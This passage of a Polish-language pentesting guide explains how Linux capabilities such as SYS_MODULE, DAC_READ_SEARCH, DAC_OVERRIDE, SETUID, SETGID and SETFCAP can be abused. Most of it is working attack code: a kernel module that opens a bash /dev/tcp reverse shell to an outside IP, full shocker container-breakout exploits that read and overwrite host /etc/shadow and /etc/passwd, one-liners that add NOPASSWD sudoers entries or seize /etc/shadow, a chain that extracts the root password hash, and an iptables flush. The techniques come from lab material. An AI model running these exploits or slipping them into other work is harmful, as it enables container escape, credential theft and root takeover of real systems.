Możesz sprawdzić włączone capabilities wewnątrz kontenera Docker za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku widać, że capability **SYS_MODULE** jest włączona.

**Utwórz** **kernel module**, który będzie wykonywał reverse shell, oraz **Makefile** do jego **kompilacji**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Pusty znak przed każdym poleceniem make w pliku Makefile **musi być tabulatorem, a nie spacjami**!

Uruchom `make`, aby to skompilować.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Na koniec uruchom `nc` w jednym shellu, a następnie **załaduj moduł** z innego i przechwycisz shell w procesie nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Kod tej techniki został skopiowany z laboratorium „Abusing SYS_MODULE Capability” znajdującego się na stronie** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Inny przykład tej techniki można znaleźć na stronie [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesowi **omijanie uprawnień do odczytu plików oraz do odczytu i wykonywania katalogów**. Jego głównym zastosowaniem jest wyszukiwanie lub odczytywanie plików. Umożliwia jednak również procesowi użycie funkcji `open_by_handle_at(2)`, która może uzyskać dostęp do dowolnego pliku, w tym do plików znajdujących się poza przestrzenią nazw montowania procesu. Uchwyt używany przez `open_by_handle_at(2)` powinien być nietransparentnym identyfikatorem uzyskanym za pomocą `name_to_handle_at(2)`, ale może zawierać poufne informacje, takie jak numery inode, które są podatne na manipulację. Możliwość wykorzystania tej capability, szczególnie w kontekście kontenerów Docker, została zaprezentowana przez Sebastiana Krahmera za pomocą exploita shocker, co opisano [tutaj](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Oznacza to, że możesz** **omijać możesz omijać kontrole uprawnień odczytu plików oraz kontrole uprawnień odczytu/wykonywania katalogów.**

**Przykład z użyciem pliku binarnego**

Plik binarny będzie mógł odczytać dowolny plik. Jeśli więc plik taki jak tar ma tę capability, będzie mógł odczytać plik shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Przykład z binary2**

W tym przypadku załóżmy, że plik binarny **`python`** ma tę capability. Aby wyświetlić pliki roota, możesz wykonać:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
A aby odczytać plik, możesz wykonać:
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

Możesz sprawdzić włączone capabilities wewnątrz kontenera Docker za pomocą:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku można zobaczyć, że capability **DAC_READ_SEARCH** jest włączona. W rezultacie kontener może **debugować procesy**.

Sposób działania poniższego exploita można poznać tutaj: [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ale podsumowując, **CAP_DAC_READ_SEARCH** nie tylko pozwala nam przemierzać system plików bez sprawdzania uprawnień, lecz także jawnie usuwa wszelkie kontrole dla _**open_by_handle_at(2)**_ i **może pozwolić naszemu procesowi na dostęp do wrażliwych plików otwartych przez inne procesy**.

Oryginalny exploit, który wykorzystuje te uprawnienia do odczytywania plików z hosta, można znaleźć tutaj: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c). Poniżej znajduje się **zmodyfikowana wersja, która pozwala wskazać plik do odczytania jako pierwszy argument i zapisać jego zawartość do pliku**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalny exploit używał pliku /.dockerinit, a ta zmodyfikowana wersja używa /etc/hostname. Jeśli exploit nie działa, być może trzeba ustawić inny plik. Aby znaleźć plik zamontowany na hoście, po prostu wykonaj polecenie mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalny exploit używał pliku /.dockerinit, a ta zmodyfikowana wersja używa...](<../../images/image (407) (1).png>)

**Kod tej techniki został skopiowany z laboratorium "Abusing DAC_READ_SEARCH Capability" ze strony** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Oznacza to, że możesz omijać sprawdzanie uprawnień zapisu dla dowolnego pliku, więc możesz zapisać dowolny plik.**

Istnieje wiele plików, które możesz **nadpisać, aby eskalować uprawnienia,** [**pomysły możesz znaleźć tutaj**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Przykład z binary**

W tym przykładzie vim ma tę capability, więc możesz modyfikować dowolny plik, taki jak _passwd_, _sudoers_ lub _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Przykład z plikiem binarnym 2**

W tym przykładzie plik binarny **`python`** będzie mieć tę capability. Możesz użyć Pythona, aby nadpisać dowolny plik:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Przykład ze środowiskiem + CAP_DAC_READ_SEARCH (Docker breakout)**

Możesz sprawdzić włączone capabilities wewnątrz kontenera Docker za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Przede wszystkim przeczytaj poprzednią sekcję, która [**wykorzystuje capability DAC_READ_SEARCH do odczytu dowolnych plików**](linux-capabilities.md#cap_dac_read_search) hosta, i **skompiluj** exploit.\
Następnie **skompiluj poniższą wersję exploita shocker**, która umożliwi **zapis dowolnych plików** w systemie plików hosta:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Aby **wydostać się z kontenera Docker**, możesz **pobrać** pliki `/etc/shadow` i `/etc/passwd` z hosta, **dodać** do nich **nowego użytkownika** i użyć **`shocker_write`**, aby je nadpisać. Następnie uzyskaj **dostęp** przez **ssh**.

**Kod tej techniki został skopiowany z laboratorium „Abusing DAC_OVERRIDE Capability” znajdującego się na stronie** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Oznacza to, że można zmienić właściciela dowolnego pliku.**

**Przykład z binary**

Załóżmy, że binary **`python`** ma tę capability. Możesz **zmienić** właściciela pliku **`shadow`**, **zmienić hasło roota** i eskalować uprawnienia:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Lub z plikiem binarnym **`ruby`** posiadającym tę capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Oznacza to, że można zmienić uprawnienia dowolnego pliku.**

**Przykład z użyciem binary**

Jeśli Python ma tę capability, można zmodyfikować uprawnienia pliku shadow, **zmienić hasło roota** i eskalować uprawnienia:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Oznacza to, że można ustawić efektywny identyfikator użytkownika utworzonego procesu.**

**Przykład z użyciem pliku binarnego**

Jeśli Python ma tę **capability**, można bardzo łatwo wykorzystać ją do eskalacji uprawnień do root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Inny sposób:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Oznacza to, że można ustawić efektywny identyfikator grupy utworzonego procesu.**

Istnieje wiele plików, które można **nadpisać w celu eskalacji uprawnień,** [**tutaj znajdziesz pomysły**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Przykład z plikiem binarnym**

W tym przypadku należy szukać interesujących plików, które grupa może odczytać, ponieważ można podszyć się pod dowolną grupę:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Po znalezieniu pliku, który możesz wykorzystać (poprzez odczyt lub zapis) do eskalacji uprawnień, możesz **uzyskać shell podszywający się pod interesującą grupę** za pomocą:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
W tym przypadku podszyto się pod grupę shadow, dzięki czemu można odczytać plik `/etc/shadow`:
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

Gdy obie capabilities są dostępne w tym samym helperze, praktyczny chain wygląda tak:

1. Przełącz EGID na `shadow` (lub inną uprzywilejowaną grupę).
2. Użyj `chown` na `/etc/shadow`, aby ustawić swój UID, zachowując grupę `shadow`.
3. Odczytaj docelowy hash i wykonaj crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Pozwala to uniknąć konieczności uzyskania pełnego **root** bezpośrednio i często wystarcza do wykonania pivota poprzez ponowne użycie poświadczeń.

Jeśli zainstalowany jest **docker**, możesz **impersonate** grupę **docker** i nadużyć jej, aby komunikować się z [**docker socket** i eskalować uprawnienia](#writable-docker-socket).

## CAP_SETFCAP

**Oznacza to, że można ustawiać capabilities na plikach i procesach**

**Przykład z binary**

Jeśli python ma tę **capability**, możesz bardzo łatwo ją nadużyć, aby eskalować uprawnienia do root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Pamiętaj, że jeśli ustawisz nową capability dla pliku binarnego za pomocą CAP_SETFCAP, utracisz tę capability.

Gdy masz [SETUID capability](linux-capabilities.md#cap_setuid), możesz przejść do tej sekcji, aby zobaczyć, jak eskalować uprawnienia.

**Przykład ze środowiskiem (Docker breakout)**

Domyślnie capability **CAP_SETFCAP jest nadawana procesowi wewnątrz kontenera w Dockerze**. Możesz to sprawdzić, wykonując coś takiego:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ta capability pozwala **nadawać binariom dowolne inne capability**, więc możemy rozważyć **escaping** z kontenera poprzez **abusing dowolnego z pozostałych capability breakouts** wspomnianych na tej stronie.\
Jednak jeśli spróbujesz nadać na przykład capability CAP_SYS_ADMIN i CAP_SYS_PTRACE binariowi gdb, przekonasz się, że możesz je nadać, ale po tej operacji **binary nie będzie można uruchomić**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Z dokumentacji](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Jest to **ograniczający nadzbiór dla effective capabilities**, które wątek może przyjąć. Jest to również ograniczający nadzbiór dla capabilities, które mogą zostać dodane do inheri‐table set przez wątek, który **nie posiada capability CAP_SETPCAP** w swoim effective set._\
Wygląda na to, że Permitted capabilities ograniczają capabilities, których można używać.\
Jednak Docker domyślnie również przyznaje **CAP_SETPCAP**, więc możliwe może być **ustawienie nowych capabilities wewnątrz inheritable set**.\
Jednak w dokumentacji tej capability znajduje się informacja: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
Wygląda na to, że do inheritable set możemy dodawać wyłącznie capabilities z bounding set. Oznacza to, że **nie możemy umieścić nowych capabilities, takich jak CAP_SYS_ADMIN lub CAP_SYS_PTRACE, w inherit set w celu eskalacji uprawnień**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) zapewnia szereg wrażliwych operacji, w tym dostęp do `/dev/mem`, `/dev/kmem` lub `/proc/kcore`, modyfikowanie `mmap_min_addr`, dostęp do wywołań systemowych `ioperm(2)` i `iopl(2)` oraz różnych poleceń dyskowych. `FIBMAP ioctl(2)` jest również włączone za pośrednictwem tej capability, co powodowało problemy w [przeszłości](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Zgodnie ze stroną man pozwala to również posiadaczowi na opisowe `perform a range of device-specific operations on other devices`.

Może to być przydatne do **eskalacji uprawnień** i **Docker breakout.**

## CAP_KILL

**Oznacza to, że można zabić dowolny proces.**

**Przykład z binary**

Załóżmy, że binary **`python`** ma tę capability. Jeśli udałoby Ci się **również zmodyfikować konfigurację jakiejś usługi lub socketu** (albo dowolny plik konfiguracyjny związany z usługą), możesz umieścić w niej backdoor, a następnie zabić proces powiązany z tą usługą i zaczekać, aż nowy plik konfiguracyjny zostanie wykonany wraz z Twoim backdoorem.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc za pomocą kill**

Jeśli masz capabilities kill i istnieje **program node działający jako root** (lub jako inny użytkownik), prawdopodobnie możesz **wysłać** mu **sygnał SIGUSR1** i sprawić, aby **otworzył debugger node**, z którym możesz się połączyć.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Oznacza to, że możliwe jest nasłuchiwanie na dowolnym porcie (nawet na portach uprzywilejowanych). Nie można bezpośrednio eskalować uprawnień za pomocą tej capability.**

**Przykład z plikiem binarnym**

Jeśli **`python`** posiada tę capability, będzie mógł nasłuchiwać na dowolnym porcie, a nawet łączyć się z niego z dowolnym innym portem (niektóre usługi wymagają połączeń z określonych portów uprzywilejowanych).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability pozwala procesom **tworzyć sockety RAW i PACKET**, umożliwiając im generowanie i wysyłanie dowolnych pakietów sieciowych. Może to prowadzić do zagrożeń bezpieczeństwa w środowiskach kontenerowych, takich jak spoofing pakietów, wstrzykiwanie ruchu i omijanie kontroli dostępu do sieci. Złośliwi aktorzy mogą wykorzystać tę możliwość do zakłócania routingu kontenera lub naruszenia bezpieczeństwa sieci hosta, szczególnie bez odpowiedniej ochrony firewall. Ponadto **CAP_NET_RAW** ma kluczowe znaczenie dla uprzywilejowanych kontenerów, aby obsługiwać operacje takie jak ping za pomocą żądań RAW ICMP.

**Oznacza to, że możliwe jest przechwytywanie ruchu.** Nie można bezpośrednio eskalować uprawnień za pomocą tej capability.

**Przykład z plikiem binarnym**

Jeśli binary **`tcpdump`** ma tę capability, będzie można użyć go do przechwytywania informacji sieciowych.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Zauważ, że jeśli **environment** nadaje tę capability, możesz również użyć **`tcpdump`** do sniffowania ruchu.

**Przykład z plikiem binarnym 2**

Poniższy przykład to kod **`python2`**, który może być przydatny do przechwytywania ruchu interfejsu **„lo”** (**localhost**). Kod pochodzi z labu "_The Basics: CAP-NET_BIND + NET_RAW" dostępnego pod adresem [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability grants the holder the power to **zmieniać konfiguracje sieci**, w tym ustawienia firewalla, tablice routingu, uprawnienia socketów oraz ustawienia interfejsów sieciowych w obrębie udostępnionych network namespaces. Umożliwia również włączanie **promiscuous mode** na interfejsach sieciowych, co pozwala na sniffing pakietów w różnych network namespaces.

**Przykład z plikiem binarnym**

Załóżmy, że **python binary** ma te capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Oznacza to, że możliwe jest modyfikowanie atrybutów inode.** Nie można bezpośrednio eskalować uprawnień za pomocą tej capability.

**Example with binary**

Jeśli znajdziesz plik oznaczony jako immutable, a Python ma tę capability, możesz **usunąć atrybut immutable i umożliwić modyfikowanie pliku:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
